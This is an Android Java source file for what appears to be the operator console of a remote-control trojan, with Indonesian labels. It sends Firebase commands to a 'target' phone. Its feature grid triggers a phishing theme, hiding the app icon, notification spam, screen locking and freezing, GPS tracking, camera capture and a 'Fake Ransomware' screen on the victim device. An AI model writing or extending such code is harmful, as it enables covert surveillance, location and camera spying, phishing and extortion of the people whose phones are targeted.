package com.paragon.control;

import android.app.AlertDialog;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class ControlActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private GridLayout gridFitur;
    private Button btnBack;
    private String targetId;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        gridFitur = findViewById(R.id.gridFitur);
        btnBack = findViewById(R.id.btnBack);

        targetId = getIntent().getStringExtra("targetId");

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target").child(targetId);

        btnBack.setOnClickListener(v -> finish());

        if (targetId == null) {
            Toast.makeText(this, "⚠️ Target tidak ditemukan", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }

        setupGrid();
    }

    private void setupGrid() {
        String[] fiturNames = {
            "Flashlight", "Lock Low", "Lock Custom V2", "Tema Phising",
            "Video Overlay", "Hide Icon", "Spam Notifikasi", "Stuck Layar",
            "GPS", "Kamera", "Fake Ransomware", "Ngehang"
        };
        String[] fiturIcons = {"🔦", "🔒", "🔒", "🎨", "🎬", "👻", "📨", "🔒", "📍", "📸", "💰", "💀"};
        boolean[] isToggle = {true, true, true, false, false, true, false, false, false, false, false, true};

        gridFitur.removeAllViews();

        for (int i = 0; i < fiturNames.length; i++) {
            View card = getLayoutInflater().inflate(R.layout.card_fitur_premium, null);

            TextView icon = card.findViewById(R.id.ivIcon);
            TextView nama = card.findViewById(R.id.tvNamaFitur);
            TextView status = card.findViewById(R.id.tvStatusFitur);
            Switch sw = card.findViewById(R.id.swFitur);
            Button btnAction = card.findViewById(R.id.btnAction);

            icon.setText(fiturIcons[i]);
            nama.setText(fiturNames[i]);

            if (isToggle[i]) {
                sw.setVisibility(View.VISIBLE);
                btnAction.setVisibility(View.GONE);
                status.setVisibility(View.VISIBLE);

                status.setText("OFF");
                status.setTextColor(0xFF8B0000);

                final int index = i;
                sw.setOnCheckedChangeListener((buttonView, isChecked) -> {
                    status.setText(isChecked ? "ON" : "OFF");
                    status.setTextColor(isChecked ? 0xFFFF1A1A : 0xFF8B0000);
                    mDatabase.child(fiturNames[index].toLowerCase()).setValue(isChecked);
                    showSnackbar("✅ " + fiturNames[index] + " " + (isChecked ? "ON" : "OFF"));
                });
            } else {
                sw.setVisibility(View.GONE);
                btnAction.setVisibility(View.VISIBLE);
                status.setVisibility(View.GONE);

                final int index = i;
                btnAction.setOnClickListener(v -> {
                    showConfirmDialog(fiturNames[index]);
                });
            }

            gridFitur.addView(card);
        }
    }

    private void showConfirmDialog(String fiturName) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🐉 Konfirmasi");
        builder.setMessage("Apakah Anda yakin ingin menjalankan fitur " + fiturName + "?");
        builder.setPositiveButton("🔥 Jalankan", (dialog, which) -> {
            showSnackbar("⏳ Mengirim perintah...");
            handler.postDelayed(() -> {
                mDatabase.child("command").setValue(fiturName.toLowerCase());
                showSnackbar("✅ Perintah berhasil dikirim ke target");
            }, 1000);
        });
        builder.setNegativeButton("🐉 Batal", null);
        builder.show();
    }

    private void showSnackbar(String message) {
        Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
    }
}
